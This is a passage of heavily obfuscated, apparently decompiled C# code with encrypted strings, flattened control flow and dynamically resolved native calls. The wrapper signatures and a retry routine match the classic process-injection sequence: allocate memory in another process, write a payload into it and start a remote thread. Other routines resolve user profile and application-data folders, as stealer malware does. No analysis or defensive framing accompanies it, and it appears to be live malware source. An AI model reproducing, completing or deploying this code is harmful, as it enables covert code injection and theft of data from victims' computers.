							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c941a2887fe558f6836")] = lpParameter;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9d3a2b259c319b2afe")] = dwCreationFlags;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1d9fe925e33331e7010")] = threadId;
							object[] array8362 = array8361;
							string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("76ef21d61fff0f11e2812eed6732de6ea9d");
							string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("8c59092a0484240dd221912f9a3dd7a4b20ce944d7b59c7");
							Type typeFromHandle = typeof(IntPtr);
							Type[] array8363 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4eea352c179a143389d")];
							array8363 [0] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f99b2aba18d8d270f6a")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9dd9cd40bcfd570494")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae01dbdca694f9c5882")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ad3ee48e279a142f1cd")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9a1bd061c46ac3a47")] = typeof(uint);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e94d3ded9c61badea1")] = typeof(IntPtr).MakeByRefType ();
							int name = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("57811da21b0128aff9d");
							tree545[] array8364 = new tree545[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6c1b85e7151d84b629c")];
							array8364 [0] = new tree545 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae8218e185921b288b9"), (ParameterAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c94f0edbeacf45ee87d"));
							object[] array8365 = node847 (left8243, limit, typeFromHandle, array8363, array8362, (CharSet)name, array8364);
							threadId = (IntPtr)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae9c36b87899a9b1480")];
							return (IntPtr)array8365 [0];
						}, IntPtr.Zero);
						cache8804 = threadId;
						return result;
					}
					}
					break;
				}
			}
		}

		public IntPtr buffer483 (IntPtr range4044, IntPtr avg949, uint parent69, uint offset0077, uint item5890, string left6356)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("8e0376bebadc152949915dc5bbf84b68b58");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("e90e2338ef0e162573c47bb0d6fef6fae259792ff7be9fa");
				Type typeFromHandle = typeof(IntPtr);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f978795017d903ac3fa")];
				array8361 [0] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("adb71dac7593e8f636c")] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bfef453c939acedb3ce")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e970a31a33ec812ad16")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d95ebdc529e37ed4413")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9bdcc363beba10353e")] = typeof(string);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e93736cb29f78d292de")];
				array8362 [0] = range4044;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c95eb5f51431968e4d")] = avg949;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c90243289de3c9662b7")] = parent69;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7d24a7fb8fa31c0ec9f")] = offset0077;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f904e7c336d2af0afbc")] = item5890;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9c8b9a091f4ee4f873")] = left6356;
				return (IntPtr)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9cc961135f03d1ad6")) [0];
			}, IntPtr.Zero);
		}

		public IntPtr total63 (IntPtr previous4868, uint flag18, uint input4517, uint id52, IntPtr count492)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("0c9192f6576b339f582b13c96ab811fc3f3");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("3d9b1744d25cafdef6f4b83394958876bd236");
				Type typeFromHandle = typeof(IntPtr);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9cd27828ad959285883")];
				array8361 [0] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d951e066c7cb51f153c")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bf943e762e993d2d383")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c9fd902033ed15cf1e")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("76eb78f94b4308edd9e")] = typeof(IntPtr);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0e96e58c9f9b27404bb")];
				array8362 [0] = previous4868;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6c703e6e651e14b5b9f")] = flag18;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f90f2eab8fc925a143")] = input4517;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("af7ca6a399917c49ff9")] = id52;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c578d4da8905e6ae1f")] = count492;
				return (IntPtr)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f9f54e2bed8581cbf5")) [0];
			}, IntPtr.Zero);
		}

		public bool settings49 (IntPtr width48)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("0c99990e5c9cfe40d210e24ea8c8406bba0");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("ad5402440d1322fd9817495213ba086088ddeefc5");
				Type typeFromHandle = typeof(bool);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f93f8e57ecde3492270")];
				array8361 [0] = typeof(IntPtr);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("be17bd28fe994259b58")];
				array8362 [0] = width48;
				return (bool)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc15cf3c1198c6feef3")) [0];
			}, options499: false);
		}

		public bool amount5840 (IntPtr input80, uint right349)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("2f95e60223918b4ba86df420effd413d4c3");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("65058bf6ff873e4c4615dcce70104072d2e92a9709f");
				Type typeFromHandle = typeof(bool);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9f11055b1cb701df6")];
				array8361 [0] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9685dc3fc42d7fb43")] = typeof(uint);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e52f8af229a0e1864c")];
				array8362 [0] = input80;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9e455d1b2caf0558ff")] = right349;
				return (bool)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7757db76fabad91409e")) [0];
			}, options499: false);
		}

		public bool line3053 (IntPtr stream64)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("404f41202b2f7385851e26ab6155c809b9d");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("3c95d6c9c2c84caa1f430688884b4eda0");
				Type typeFromHandle = typeof(bool);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9792ed28f687f1b55")];
				array8361 [0] = typeof(IntPtr);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("41dfba7b3280c32b69c")];
				array8362 [0] = stream64;
				return (bool)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9b2c16c628dc426fd")) [0];
			}, options499: false);
		}

		public int max88 (int max74)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("c9a75e8a8f1fe5aad9c6897ea9678f4");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("d9e886bbabcabcc5ba315dcde29835a427615727b4c");
				Type typeFromHandle = typeof(int);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9d9a77206a9a5a17b")];
				array8361 [0] = typeof(int);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5b25de5bf910f8bb59e")];
				array8362 [0] = max74;
				return (int)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd865c6ba59be5d354f")) [0];
			}, 0);
		}
	}
}
namespace number366
{
	public class stack564
	{
		public static time90 map5297 = new time90 ();

		public static byte[] start642 (byte[] color09, byte[] output3682 = null)
		{
			return map5297.cell7644 (color09, output3682);
		}

		public static array8360.message891 array6147 (string source7725)
		{
			array8360.source274 mode8608 = new array8360.source274 ();
			map5297.graph2123 (null, source7725, IntPtr.Zero, IntPtr.Zero, left9274: false, (uint)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5cd3d42d9c06dfa809c"), IntPtr.Zero, null, ref mode8608, out var key);
			return key;
		}

		public static int? total02 (IntPtr format741)
		{
			if (data780.stack3101) {
				bool? flag6145 = default(bool?);
				int? result = default(int?);
				while (true) {
					int num = -1609002366;
					while (true) {
						uint num2 = (uint)(num ^ -342649136);
						int value;
						switch (num2 % 7) {
						case 5u:
							break;
						default:
							num = -1609002366;
							continue;
						case 3u:
							goto IL_0042;
						case 0u:
							if (!flag6145.Value) {
								num = ~1849159627;
								continue;
							}
							value = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("576d2942fbd96b7b29f");
							goto IL_00ad;
						case 1u:
							return result;
						case 2u:
							result = null;
							num = (int)(0 - num2) + -1503727742;
							continue;
						case 4u:
							value = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e2b4195a39143420e0");
							goto IL_00ad;
						case 6u:
							goto end_IL_000a;
							IL_00ad:
							return value;
						}
						break;
						IL_0042:
						flag6145 = item559 (format741);
						num = (flag6145.HasValue ? ((int)num2 ^ -949557581) : ((int)(num2 - 1664315822)));
					}
					continue;
					end_IL_000a:
					break;
				}
			}
			return flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f978581004c642e484d");
		}

		public static bool? item559 (IntPtr dict8611)
		{
			bool output89;
			bool? flag6145 = map5297.height570 (dict8611, out output89);
			if (!flag6145.HasValue) {
				goto IL_0017;
			}
			goto IL_008a;
			IL_0017:
			int num = ~-1103165984;
			goto IL_001d;
			IL_001d:
			bool? result = default(bool?);
			while (true) {
				uint num2 = (uint)(-num ^ -250461261);
				switch (num2 % 7) {
				case 0u:
					break;
				default:
					num = 1103165983;
					continue;
				case 6u:
					result = null;
					num = (int)(num2 - 762857328);
					continue;
				case 1u:
					result = null;
					num = (int)(0 - num2) ^ -22262294;
					continue;
				case 4u:
					return result;
				case 2u:
					return result;
				case 3u:
					goto IL_008a;
				case 5u:
					return output89;
				}
				break;
			}
			goto IL_0017;
			IL_008a:
			num = (flag6145.Value ? (~-1770134964) : (~-1081065896));
			goto IL_001d;
		}

		public static IntPtr date0630 (IntPtr date45, IntPtr dict721, IntPtr time121, uint amount56, uint date27)
		{
			return map5297.cache879 (date45, dict721, time121, amount56, date27);
		}

		public static bool state1203 (IntPtr error78, IntPtr file13, byte[] result973, IntPtr line1106, out IntPtr data948)
		{
			return map5297.stream774 (error78, file13, result973, line1106, out data948);
		}

		public static IntPtr balance0952 (IntPtr temp92, IntPtr previous9813, IntPtr tree350, IntPtr input298, IntPtr left37, uint name367, out IntPtr height716)
		{
			return map5297.page5988 (temp92, previous9813, tree350, input298, left37, name367, out height716);
		}

		public static IntPtr session3768 (IntPtr code39, IntPtr map2962, uint stream67, uint next1260, uint row85, string flag2923)
		{
			return map5297.buffer483 (code39, map2962, stream67, next1260, row85, flag2923);
		}

		public static IntPtr total0017 (IntPtr avg34, uint state349, uint date7000, uint limit24, IntPtr tree81)
		{
			return map5297.total63 (avg34, state349, date7000, limit24, tree81);
		}

		public static bool score9135 (IntPtr dict32)
		{
			return map5297.settings49 (dict32);
		}

		public static bool buffer78 (IntPtr context04, uint message777 = 0u)
		{
			return map5297.amount5840 (context04, message777);
		}

		public static bool limit89 (IntPtr format8115)
		{
			return map5297.line3053 (format8115);
		}

		public static int child508 (int args83)
		{
			return map5297.max88 (args83);
		}

		public static bool count97 (IntPtr row876, byte[] page45, int color70 = 3)
		{
			int num = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c0ea4839a9dd6c419b");
			IntPtr intPtr = default(IntPtr);
			while (true) {
				int num2 = ~-1750899543;
				while (true) {
					uint num3;
					IntPtr height;
					switch ((num3 = (uint)(num2 + -143093038)) % 9) {
					case 2u:
						break;
					default:
						num2 = 1750899542;
						continue;
					case 4u:
						return flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("705d1162b4b9c");
					case 8u:
						intPtr = date0630 (row876, IntPtr.Zero, (IntPtr)page45.Length, (uint)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9a0837619c01fb2727"), flag6144.d4c6797c3b454648b4042912e872f293 ("d94b6bad84cf19b5e74"));
						num2 = ((!(intPtr == IntPtr.Zero)) ? 659160353 : (--847003905));
						continue;
					case 0u:
						num2 = ((balance0952 (row876, IntPtr.Zero, IntPtr.Zero, intPtr, IntPtr.Zero, 0u, out height) == IntPtr.Zero) ? ((int)(~num3) + -2129732076) : ((int)(0 - num3) ^ -2130897376));
						continue;
					case 1u:
						num2 = (int)(0 - num3) + -691835789;
						continue;
					case 5u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("608ffa00604d61e6c9d");
						num2 = 1995325003;
						continue;
					case 6u:
						num2 = ((num <= color70) ? 1517588076 : 646049797);
						continue;
					case 7u:
						num2 = ((!state1203 (row876, intPtr, page45, (IntPtr)page45.Length, out height)) ? ((int)num3 - -330936590) : ((int)num3 - -945257037));
						continue;
					case 3u:
						return false;
					}
					break;
				}
			}
		}
	}
}
namespace row8372
{
	public class array8360
	{
		[StructLayout (LayoutKind.Sequential, CharSet = CharSet.Auto)]
		public struct source274
		{
			public int cache080 = Marshal.SizeOf (typeof(source274));

			public string temp662 = null;

			public string output0635 = null;

			public string amount5113 = null;

			public int result417 = 0;

			public int width92 = 0;

			public int id81 = 0;

			public int size556 = 0;

			public int line7938 = 0;

			public int avg77 = 0;

			public int input84 = 0;

			public int graph072 = 0;

			public short page5593 = 0;

			public short column45 = 0;

			public IntPtr end04 = default(IntPtr);

			public IntPtr time30 = default(IntPtr);

			public IntPtr dir47 = default(IntPtr);

			public IntPtr result39 = default(IntPtr);

			public source274 ()
			{
			}
		}

		public struct message891
		{
			public IntPtr next15;

			public IntPtr start2547;

			public int sum05;

			public int index0187;
		}

		public struct buffer6984
		{
			public readonly int map2705 = Marshal.SizeOf (typeof(buffer6984));

			public readonly int text38 = 0;

			public IntPtr rate20 = IntPtr.Zero;

			public readonly string score75 = null;

			public buffer6984 ()
			{
			}
		}

		public struct product66
		{
			public readonly int id2825;

			public IntPtr path64;

			public product66 (byte[] source848)
			{
				if (source848 == null) {
					source848 = new byte[0];
				}
				path64 = Marshal.AllocHGlobal (source848.Length);
				id2825 = source848.Length;
				Marshal.Copy (source848, 0, path64, source848.Length);
			}

			public byte[] status6471 ()
			{
				byte[] array8361 = new byte[id2825];
				while (true) {
					int num = ~748012636;
					while (true) {
						uint num2 = (uint)(num + -1605142822);
						switch (num2 % 6) {
						case 5u:
							break;
						default:
							num = -748012637;
							continue;
						case 4u:
							Marshal.FreeHGlobal (path64);
							num = -1976900272;
							continue;
						case 3u:
							num = ((!(path64 != IntPtr.Zero)) ? ((int)num2 + -2101331417) : ((int)(0 - num2) + -686392569));
							continue;
						case 1u:
							num = ((id2825 <= 0) ? ((int)(~num2 ^ 0x1F06B824)) : ((int)num2 + -59534808));
							continue;
						case 0u:
							Marshal.Copy (path64, array8361, 0, id2825);
							num = (int)((0 - num2) ^ 0xA5E3C38);
							continue;
						case 2u:
							return array8361;
						}
						break;
					}
				}
			}
		}
	}
}
namespace position51
{
	public class position291
	{
		public static string price61 => Environment.GetFolderPath ((Environment.SpecialFolder)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd93d9c37b925454769"));

		public static string child9967 => Environment.GetFolderPath ((Environment.SpecialFolder)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7681a0cf30d7407b09d"));

		public static string speed8282 => Environment.GetFolderPath ((Environment.SpecialFolder)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5e30bfc0526443c3e9f"));

		public static string max79 => Environment.ExpandEnvironmentVariables (flag6144.0e291526dfde44109a60e580c474e7dd ("2f930babfe3985a21dcae7d8a08a411c381"));

		public static string graph9900 => Path.Combine (price61, flag6144.0e291526dfde44109a60e580c474e7dd ("485f34a4f02767b8ca1d0aa6d9e"));

		public static string map2838 => Environment.GetFolderPath ((Environment.SpecialFolder)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c98080e3dbf4309c0e5"));
	}
}
namespace position978
{
	public static class array7199
	{
		public static List<DirectoryInfo> name5055 ()
		{
			List<DirectoryInfo> list839 = new List<DirectoryInfo> ();
			while (true) {
				int num = ~1459873351;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + -1577384446)) % 6) {
					case 5u:
						break;
					default:
						num = -1459873352;
						continue;
					case 0u:
						num = ((!Directory.Exists (position291.price61)) ? (~1960888191) : (-717487907));
						continue;
					case 3u:
						list839.Add (new DirectoryInfo (position291.child9967));
						num = (int)num2 - -330752851;
						continue;
					case 1u:
						list839.Add (new DirectoryInfo (position291.price61));
						num = (int)num2 ^ -64471457;
						continue;
					case 4u:
						num = (int)(Directory.Exists (position291.child9967) ? ((0 - num2) ^ 0x1A5CD8BB) : (num2 ^ 0x2FF13DE8));
						continue;
					case 2u:
						return list839;
					}
					break;
				}
			}
		}

		public static string level443 (string state26)
		{
			if (string.IsNullOrEmpty (state26)) {
				goto IL_0008;
			}
			goto IL_005f;
			IL_0008:
			int num = -1963694690;
			goto IL_000d;
			IL_000d:
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num ^ -1969401163)) % 5) {
				case 0u:
					break;
				default:
					num = -1963694690;
					continue;
				case 3u:
					return state26;
				case 1u:
					state26 += flag6144.0e291526dfde44109a60e580c474e7dd ("0f926617cceef");
					num = (int)((0 - num2) ^ 0x5A1E3AF2);
					continue;
				case 2u:
					goto IL_005f;
				case 4u:
					return state26;
				}
				break;
			}
			goto IL_0008;
			IL_005f:
			state26 = range94 (state26);
			num = ((!state26.EndsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("e9f35cceb5ef0"))) ? (~408059960) : (-925767556));
			goto IL_000d;
		}

		public static string range94 (string number409)
		{
			if (number409.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("9d0ea55c75e7ce93e8eb0cf22df"))) {
				goto IL_0015;
			}
			goto IL_0135;
			IL_0015:
			int num = 133617325;
			goto IL_001a;
			IL_001a:
			while (true) {
				uint num2 = (uint)(num - -1779974403);
				switch (num2 % 11) {
				case 0u:
					break;
				default:
					num = 133617325;
					continue;
				case 1u:
					goto IL_005e;
				case 10u:
					return number409.Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("61219545ecab6af9b3a183ab09425cf219a219e"), position291.map2838);
				case 8u:
					goto IL_00a3;
				case 2u:
					goto IL_00c8;
				case 7u:
					number409 = number409.Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("e9beae45650f2517ff8e0a5051a7dc619"), position291.speed8282);
					num = (int)num2 ^ -868584251;
					continue;
				case 6u:
					number409 = number409.Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("ae91faa4394589731f2256982"), position291.price61);
					num = (int)num2 ^ -1623530067;
					continue;
				case 5u:
					goto IL_0135;
				case 9u:
					return number409.Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("2f9a2dcd169b6aa93750ebcef9717"), position291.child9967);
				case 4u:
					return Environment.GetFolderPath ((Environment.SpecialFolder)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9c13b5b9866434421"));
				case 3u:
					return Environment.ExpandEnvironmentVariables (number409);
				}
				break;
				IL_00c8:
				num = (number409.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("4d2765e8eec67b6102b5516333f37279d")) ? (--257478571) : (~1253350292));
				continue;
				IL_00a3:
				num = ((!number409.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("d9d4b89dbcb60f355edd5c9a4"))) ? (-486782005) : 330198371);
				continue;
				IL_005e:
				num = (number409.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("0f959302a85b723b0072d60cc4523")) ? (-399327016) : (-739863752));
			}
			goto IL_0015;
			IL_0135:
			num = ((!number409.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("bc2c29161f830eef3ab191e1b2cb11583b061a4"))) ? (-26849379) : 26419702);
			goto IL_001a;
		}
	}
}
namespace target12
{
	public static class options800
	{
		public static string status333 (string output510, string target2680)
		{
			if (!string.IsNullOrEmpty (output510)) {
				int num7 = default(int);
				int num5 = default(int);
				int num4 = default(int);
				int num3 = default(int);
				int num6 = default(int);
				int num9 = default(int);
				while (true) {
					int num = 185165023;
					while (true) {
						uint num2 = (uint)(num + 853080190);
						switch (num2 % 32) {
						case 30u:
							break;
						default:
							num = 185165023;
							continue;
						case 23u:
							num = (int)num2 ^ -550244147;
							continue;
						case 5u:
							num7 = num5 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9ec36927669bc0d4e7e");
							num = 116556258;
							continue;
						case 19u:
							goto IL_00d1;
						case 29u:
							goto IL_010a;
						case 26u:
							num4 = num3;
							num = -172703991;
							continue;
						case 0u:
							num6 = line63 (output510, num7);
							num = (int)(0 - num2 + 1786875934);
							continue;
						case 17u:
							num4 = num3;
							num = (int)num2 ^ -1272675733;
							continue;
						case 10u:
							goto IL_0160;
						case 14u:
							goto IL_017d;
						case 21u:
							return string.Empty;
						case 3u:
							num4 = num5 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9c879fa28c2f853cf1");
							num = (int)num2 ^ -1745451943;
							continue;
						case 9u:
							return array57 (output510, num3);
						case 18u:
							goto IL_01e5;
						case 28u:
							goto IL_0213;
						case 2u:
							goto IL_023a;
						case 31u:
							goto IL_026e;
						case 6u:
							return string.Empty;
						case 13u:
							return stream76 (output510, num3);
						case 20u:
							return string.Empty;
						case 7u:
							num = (int)num2 + -1302669773;
							continue;
						case 8u:
							goto IL_02de;
						case 11u:
							goto IL_02f5;
						case 27u:
							goto IL_031d;
						case 12u:
							goto IL_035c;
						case 4u:
							num5 = output510.IndexOf ((char)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c98dcd7a19dd69ccf99"), num4);
							num = 75584750;
							continue;
						case 22u:
							goto IL_03a0;
						case 16u:
							num4 = 0;
							num = -754809607;
							continue;
						case 24u:
							goto IL_03d9;
						case 25u:
							return queue7288 (output510, num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f923b488153da09192"));
						case 1u:
							goto end_IL_000b;
						case 15u:
							return string.Empty;
						}
						break;
						IL_03d9:
						num = ((num4 < output510.Length) ? (~-694493927) : (~-1176055634));
						continue;
						IL_0338:
						num3 = num6 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9da6b3d6acb41eab83");
						int num8;
						num = ((num8 == 0) ? (--1005786963) : (-366858911));
						continue;
						IL_026e:
						num3 = row623 (output510, num3);
						num = ((num3 >= output510.Length) ? (~538351843) : (--585120852));
						continue;
						IL_03a0:
						num = (int)((output510 [num3] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac775d004a97b2b103c")) ? (num2 ^ 0x450DBC9D) : (num2 + 1800465977));
						continue;
						IL_01e5:
						num = (int)((output510 [num3] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae7c16784694a8ae9f9")) ? (0 - num2 + 899849198) : (num2 ^ 0x49E76116));
						continue;
						IL_0160:
						num9 = num6 - num7;
						if (num9 == target2680.Length) {
							num = -791608899;
							continue;
						}
						num8 = 0;
						goto IL_0338;
						IL_035c:
						num = ((num5 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9eb8c49290de5642b")) ? ((int)(0 - num2) ^ -2143301021) : ((int)((0 - num2) ^ 0x2CE5697E)));
						continue;
						IL_023a:
						num3 = row623 (output510, num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8cfd57360990ebf6053"));
						num = ((num3 >= output510.Length) ? (-501661258) : (~103760175));
						continue;
						IL_010a:
						num = (int)((!string.IsNullOrEmpty (target2680)) ? (num2 - 233509003) : ((0 - num2) ^ 0x142E6160));
						continue;
						IL_031d:
						num8 = ((string.Compare (output510, num7, target2680, 0, num9, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9aedf9f77e0ea42623")) == 0) ? 1 : 0);
						goto IL_0338;
						IL_02f5:
						num = ((output510 [num3] == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f96838bc41c8a8001aa")) ? (-681088369) : 960332760);
						continue;
						IL_017d:
						num = ((output510 [num3] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc115b63e19bcfc0ab5")) ? 811604653 : (~-7989340));
						continue;
						IL_0213:
						num = ((num6 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("77a0939c785cadfe09c")) ? ((int)num2 + -1855758580) : ((int)(0 - num2) ^ -2037905848));
						continue;
						IL_02de:
						num = ((num5 <= 0) ? 852009863 : 530698037);
						continue;
						IL_00d1:
						num = ((output510 [num5 - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9c6773027cb11bb8b8")] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c92141050dcc0ca0356")) ? ((int)(~num2) + -2059179205) : ((int)(0 - num2 + 1824512280)));
					}
					continue;
					end_IL_000b:
					break;
				}
			}
			return string.Empty;
		}

		private static int line63 (string array8981, int child520)
		{
			int num = child520;
			while (true) {
				int num2 = ((num < array8981.Length) ? 1641289866 : (~-1145075287));
				while (true) {
					uint num3 = (uint)(num2 - 959977645);
					switch (num3 % 8) {
					case 6u:
						num2 = 1641289866;
						continue;
					default:
						num2 = 1641289866;
						continue;
					case 0u:
						break;
					case 3u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("691fef130dd43c7099c");
						num2 = (int)(0 - num3) + -1011748016;
						continue;
					case 2u:
						num2 = ((array8981 [num] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8dbff58d8c94101d841")) ? 1029021108 : 1826928841);
						continue;
					case 5u:
						num2 = ((array8981 [num] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("773f8802d736979099c")) ? (~-1575419632) : 1173284760);
						continue;
					case 4u:
						return num;
					case 7u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c917a6ca08c8c261675");
						num2 = -1225055131;
						continue;
					case 1u:
						return flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c57fd0c7f9694ce0cb");
					}
					break;
				}
			}
		}

		private static int row623 (string stream2514, int rate158)
		{
			while (true) {
				int num = ((rate158 >= stream2514.Length) ? (--645891398) : (--348392731));
				while (true) {
					uint num2 = (uint)(num ^ 0x69B44297);
					switch (num2 % 5) {
					case 4u:
						num = ~-68452947;
						continue;
					default:
						num = 68452946;
						continue;
					case 3u:
						rate158 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("77c39dfdb4b31518b9c");
						num = ~-1576442741;
						continue;
					case 1u:
						num = ((stream2514 [rate158] <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0e9310273a2c6ece2d9")) ? ((int)(num2 ^ 0x7964CDDE)) : ((int)num2 + -1458620998));
						continue;
					case 2u:
						break;
					case 0u:
						return rate158;
					}
					break;
				}
			}
		}

		private static string queue7288 (string index68, int options65)
		{
			int num = line63 (index68, options65);
			if (num == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9efb54d1066cf59b4")) {
				return string.Empty;
			}
